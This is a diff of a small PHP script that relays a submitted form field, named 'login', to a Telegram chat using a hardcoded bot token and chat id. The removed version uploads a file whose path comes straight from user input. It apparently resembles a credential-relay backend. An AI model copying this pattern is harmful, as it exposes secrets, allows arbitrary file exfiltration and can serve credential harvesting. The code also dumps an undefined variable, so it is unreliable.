@@ -1,19 +1,23 @@
 <?php
-$arr['name'] = $_POST['pht'];
+
+$login = $_POST['pht'];
+
 
 $token = '5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64';
 
-$arrayQuery = array(
-    'chat_id' => 961145889,
-    'caption' => $login,
-    'photo' => curl_file_create(__DIR__ . $arr['name'])
+$array = array(
+	'chat_id'=> 961145889,
+	'text' =>$login,
+	'parse_mode'=>'html'
 );
-$ch = curl_init('https://api.telegram.org/bot'. $token .'/sendPhoto');
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $arrayQuery);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HEADER, false);
-$res = curl_exec($ch);
-curl_close($ch);
 
-?>
+$ch = curl_init();
+curl_setopt($ch,CURLOPT_URL, 'https://api.telegram.org/bot'.$token.'/sendMessage');
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($array,"",'&'));
+$output = curl_exec($ch);
+    // закрытие сеанса curl для освобождения системных ресурсов
+curl_close($ch);
+echo "<pre>";
+var_dump(json_decode($result));
+echo '</pre>';
